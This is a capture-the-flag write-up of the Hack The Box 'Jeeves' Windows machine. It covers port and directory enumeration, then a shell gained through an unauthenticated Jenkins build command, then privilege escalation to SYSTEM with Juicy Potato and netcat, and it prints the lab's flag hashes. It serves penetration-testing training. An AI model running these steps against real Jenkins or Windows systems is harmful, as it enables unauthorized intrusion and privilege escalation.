# Jeeves
>Author : Xyan1d3
>Date : 18th July 2021
>IP : 10.10.10.63
>OS : Windows
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sun Jul 18 11:38:48 2021 as: nmap -sC -sV -v -oN nmap/jeeves 10.10.10.63
Nmap scan report for 10.10.10.63
Host is up (0.072s latency).
Not shown: 996 filtered ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h00m06s, deviation: 0s, median: 5h00m06s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-18T11:09:12
|_  start_date: 2021-07-18T11:08:27
```

Here, We see that we have two web servers.
One on `80/tcp` running `Microsoft IIS` and other at `50000/tcp` running `Jetty` which is a java webserver.

## Crackmapexec
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/jeeves]
└──╼ # crackmapexec smb 10.10.10.63
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
```

## Gobuster on `50000/tcp`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.22]─[~/htb/jeeves]
└──╼ # gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster50000.out -x asp,aspx -t 30
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.63:50000/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2021/07/18 11:43:04 Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
```

We see that we have a `/askjeeves` directory.

We visit the directory and find out that we get a `Jenkins` page without login.
![[Pasted image 20210718120049.png]]

We could now abuse its groovy shell feature to get a shell on the box.
Exploit Source : https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#create-a-new-project

- We create a new `FreeStyle` project:
	![[Pasted image 20210718120425.png]]
- We now visit the `build` to anchor at the build option and execute `windows batch command` there.
	![[Pasted image 20210718120655.png]]
	
# Initial FootHold as kohsuke
We click the `build now` button after the project is created to get a shell into the box.
![[Pasted image 20210718121724.png]]

## Getting the user Flag
```python
PS C:\Users\kohsuke\Desktop> dir


    Directory: C:\Users\kohsuke\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        11/3/2017  11:22 PM             32 user.txt                                                              


PS C:\Users\kohsuke\Desktop> cat user.txt
e3232272596fb47950d59c4cf1e7066a
```

# Root Escalation
We do a `whoami /priv` and find out that we have `SeImpersonatePrivilege`.
```python
C:\Users\kohsuke\Desktop>whoami
whoami
jeeves\kohsuke

C:\Users\kohsuke\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

We can abuse this with `Juicy Potato`.

We create a `shell.bat` which runs `nc64.exe` and gives us a shell and run our `Juicy potato Exploit`.
![[Pasted image 20210718133752.png]]

```python
PS C:\Users\kohsuke\Desktop> dir


    Directory: C:\Users\kohsuke\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        7/18/2021   8:49 AM         347648 jpota.exe                                                             
-a----        7/18/2021   7:56 AM          45272 nc64.exe                                                              
-a----        7/18/2021   9:05 AM             62 shell.bat                                                             
-ar---        11/3/2017  11:22 PM             32 user.txt                                                              


PS C:\Users\kohsuke\Desktop> .\jpota.exe -t * -p shell.bat -l 7777
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 7777
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

We get a shell back as `NT Auhtority/SYSTEM`.
![[Pasted image 20210718133916.png]]

## Getting the Root FIag
```python
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,401,025,536 bytes free

C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
C:\Users\Administrator\Desktop>dir /r
dir /r
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,401,025,536 bytes free

C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```